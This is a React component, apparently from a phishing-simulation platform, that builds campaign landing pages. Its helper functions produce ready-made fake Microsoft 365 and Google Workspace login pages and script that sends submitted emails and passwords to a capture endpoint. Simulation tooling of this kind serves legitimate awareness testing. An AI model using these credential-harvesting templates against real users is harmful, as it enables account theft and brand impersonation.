import { useState } from 'react';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from './ui/dialog';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Textarea } from './ui/textarea';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from './ui/select';
import { toast } from 'sonner';
import { Loader2 } from 'lucide-react';
import * as supabaseApi from '../lib/supabaseApi';
import { useAuth } from '../contexts/AuthContext';

interface NewLandingPageDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSuccess?: () => void;
}

export function NewLandingPageDialog({
  open,
  onOpenChange,
  onSuccess,
}: NewLandingPageDialogProps) {
  const { impersonatedTenant } = useAuth();
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    description: '',
    type: 'custom' as 'login' | 'prize' | 'update' | 'survey' | 'support' | 'custom',
    template: 'blank',
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      // Validar campos obrigatórios
      if (!formData.name.trim()) {
        toast.error('Campo obrigatório', {
          description: 'Por favor, preencha o nome da landing page',
        });
        setIsLoading(false);
        return;
      }

      // Gerar HTML básico baseado no template selecionado
      const htmlContent = generateHtmlFromTemplate(formData.template, formData.type);
      const cssContent = generateCssFromTemplate(formData.template);
      const jsContent = generateJsFromTemplate();

      // Criar landing page no banco
      const newLandingPage = await supabaseApi.createLandingPage({
        tenantId: impersonatedTenant?.id || null,
        name: formData.name,
        description: formData.description,
        type: formData.type,
        template: formData.template,
        htmlContent,
        cssContent,
        jsContent,
        captureFields: getDefaultCaptureFields(formData.type),
        status: 'draft',
      });

      console.log('✅ Landing page criada com sucesso:', newLandingPage);

      toast.success('Landing page criada!', {
        description: `"${formData.name}" foi criada com sucesso`,
      });

      // Resetar formulário
      setFormData({
        name: '',
        description: '',
        type: 'custom',
        template: 'blank',
      });

      onOpenChange(false);
      onSuccess?.();
    } catch (error: any) {
      console.error('❌ Erro ao criar landing page:', error);
      toast.error('Erro ao criar landing page', {
        description: error.message || 'Ocorreu um erro ao salvar a landing page',
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
        <form onSubmit={handleSubmit}>
          <DialogHeader>
            <DialogTitle>Criar Nova Landing Page</DialogTitle>
            <DialogDescription>
              Configure uma página de captura para sua campanha
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div>
              <Label htmlFor="name">Nome da Página *</Label>
              <Input
                id="name"
                placeholder="Ex: Login Microsoft 365"
                value={formData.name}
                onChange={(e) =>
                  setFormData((prev) => ({ ...prev, name: e.target.value }))
                }
                required
                className="mt-2"
                disabled={isLoading}
              />
            </div>

            <div>
              <Label htmlFor="description">Descrição</Label>
              <Textarea
                id="description"
                placeholder="Descreva o propósito desta página"
                value={formData.description}
                onChange={(e) =>
                  setFormData((prev) => ({ ...prev, description: e.target.value }))
                }
                rows={2}
                className="mt-2"
                disabled={isLoading}
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label htmlFor="type">Tipo de Página</Label>
                <Select
                  value={formData.type}
                  onValueChange={(value: any) =>
                    setFormData((prev) => ({ ...prev, type: value }))
                  }
                  disabled={isLoading}
                >
                  <SelectTrigger className="mt-2" id="type">
                    <SelectValue placeholder="Selecione" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="login">Login</SelectItem>
                    <SelectItem value="prize">Prêmio</SelectItem>
                    <SelectItem value="update">Atualização</SelectItem>
                    <SelectItem value="survey">Pesquisa</SelectItem>
                    <SelectItem value="support">Suporte</SelectItem>
                    <SelectItem value="custom">Customizada</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div>
                <Label htmlFor="template">Template Base</Label>
                <Select
                  value={formData.template}
                  onValueChange={(value) =>
                    setFormData((prev) => ({ ...prev, template: value }))
                  }
                  disabled={isLoading}
                >
                  <SelectTrigger className="mt-2" id="template">
                    <SelectValue placeholder="Selecione" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="microsoft-365-login">Microsoft 365 Login</SelectItem>
                    <SelectItem value="google-workspace-login">Google Workspace</SelectItem>
                    <SelectItem value="prize-survey">Pesquisa com Prêmio</SelectItem>
                    <SelectItem value="password-reset">Reset de Senha</SelectItem>
                    <SelectItem value="it-support">Suporte TI</SelectItem>
                    <SelectItem value="blank">Página em Branco</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="p-3 bg-blue-50 border border-blue-200 rounded-lg">
              <p className="text-sm text-blue-700">
                💡 <strong>Dica:</strong> Após criar a página, você pode editar o HTML/CSS/JS
                completo usando o Editor HTML Avançado.
              </p>
            </div>
          </div>
          <DialogFooter>
            <Button
              type="button"
              variant="outline"
              onClick={() => onOpenChange(false)}
              disabled={isLoading}
            >
              Cancelar
            </Button>
            <Button
              type="submit"
              className="bg-[#834a8b] hover:bg-[#6d3d75]"
              disabled={isLoading}
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Criando...
                </>
              ) : (
                'Criar Página'
              )}
            </Button>
          </DialogFooter>
        </form>
      </DialogContent>
    </Dialog>
  );
}

// Helper functions para gerar conteúdo default
function generateHtmlFromTemplate(template: string, type: string): string {
  if (template === 'microsoft-365-login') {
    return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Microsoft 365 - Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <div class="logo">
      <svg width="108" height="24" viewBox="0 0 108 24">
        <rect fill="#f25022" width="11" height="11"/>
        <rect fill="#00a4ef" x="12" width="11" height="11"/>
        <rect fill="#7fba00" y="12" width="11" height="11"/>
        <rect fill="#ffb900" x="12" y="12" width="11" height="11"/>
      </svg>
    </div>
    <h1>Microsoft 365</h1>
    <p class="subtitle">Entrar na sua conta</p>
    <form id="captureForm" action="/capture" method="POST">
      <input type="email" name="email" placeholder="Email, telefone ou Skype" required>
      <button type="submit">Avançar</button>
      <input type="password" name="password" placeholder="Senha" style="display:none;">
    </form>
    <p class="footer-text">
      Não tem uma conta? <a href="#">Crie uma!</a>
    </p>
  </div>
  <script src="script.js"></script>
</body>
</html>`;
  }

  if (template === 'google-workspace-login') {
    return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Workspace - Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <div class="logo">
      <svg width="75" height="24" viewBox="0 0 75 24">
        <path fill="#4285F4" d="M..."/>
      </svg>
    </div>
    <h1>Fazer login</h1>
    <p class="subtitle">Use sua Conta do Google</p>
    <form id="captureForm" action="/capture" method="POST">
      <input type="email" name="email" placeholder="E-mail ou telefone" required>
      <button type="submit">Próxima</button>
    </form>
    <p class="footer-text">
      <a href="#">Criar conta</a>
    </p>
  </div>
  <script src="script.js"></script>
</body>
</html>`;
  }

  // Template genérico para outros tipos
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Landing Page</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="{{CLIENT_LOGO}}" alt="Logo">
    </div>
    <h1>Título da Página</h1>
    <form id="captureForm" action="/capture" method="POST">
      <input type="email" name="email" placeholder="Email" required>
      <input type="text" name="name" placeholder="Nome" required>
      <button type="submit">Enviar</button>
    </form>
  </div>
  <script src="script.js"></script>
</body>
</html>`;
}

function generateCssFromTemplate(template: string): string {
  return `* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

.container {
  background: white;
  padding: 40px;
  border-radius: 12px;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
  width: 100%;
  max-width: 400px;
  text-align: center;
}

.logo {
  margin-bottom: 20px;
}

.logo img {
  max-width: 150px;
}

h1 {
  font-size: 24px;
  color: #333;
  margin-bottom: 10px;
}

.subtitle {
  font-size: 14px;
  color: #666;
  margin-bottom: 30px;
}

form {
  display: flex;
  flex-direction: column;
  gap: 15px;
}

input {
  padding: 12px;
  border: 1px solid #ddd;
  border-radius: 6px;
  font-size: 14px;
  transition: border-color 0.3s;
}

input:focus {
  outline: none;
  border-color: #667eea;
}

button {
  padding: 12px;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: transform 0.2s;
}

button:hover {
  transform: translateY(-2px);
}

.footer-text {
  margin-top: 20px;
  font-size: 12px;
  color: #666;
}

.footer-text a {
  color: #667eea;
  text-decoration: none;
}

.footer-text a:hover {
  text-decoration: underline;
}`;
}

function generateJsFromTemplate(): string {
  return `document.getElementById('captureForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const formData = new FormData(this);
  const data = Object.fromEntries(formData.entries());
  
  // Capturar dados
  console.log('Dados capturados:', data);
  
  // Enviar para backend
  fetch('/api/capture', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      ...data,
      timestamp: new Date().toISOString()
    })
  }).then(response => {
    if (response.ok) {
      // Redirecionar após captura
      window.location.href = '{{REDIRECT_URL}}';
    } else {
      alert('Erro ao processar. Tente novamente.');
    }
  }).catch(error => {
    console.error('Erro:', error);
    alert('Erro ao processar. Tente novamente.');
  });
});`;
}

function getDefaultCaptureFields(type: string): Array<{ key: string; label: string; type: string }> {
  if (type === 'login') {
    return [
      { key: 'email', label: 'Email', type: 'email' },
      { key: 'password', label: 'Senha', type: 'password' },
    ];
  }

  if (type === 'prize' || type === 'survey') {
    return [
      { key: 'name', label: 'Nome', type: 'text' },
      { key: 'email', label: 'Email', type: 'email' },
      { key: 'phone', label: 'Telefone', type: 'tel' },
    ];
  }

  return [
    { key: 'email', label: 'Email', type: 'email' },
    { key: 'name', label: 'Nome', type: 'text' },
  ];
}
